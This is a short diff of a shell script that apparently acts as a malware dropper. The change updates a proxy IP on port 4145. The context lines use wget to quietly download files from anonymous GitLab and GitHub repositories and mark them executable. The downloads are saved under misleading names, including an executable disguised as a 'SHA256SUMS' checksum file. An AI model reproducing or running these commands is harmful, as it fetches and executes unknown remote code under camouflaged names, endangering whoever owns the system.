@@ -1,4 +1,4 @@
-proxy="184.185.2.12" 
+proxy="142.54.239.1" 
 port="4145"
 wget -q -O CaisseNationaleSion https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x CaisseNationaleSion
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
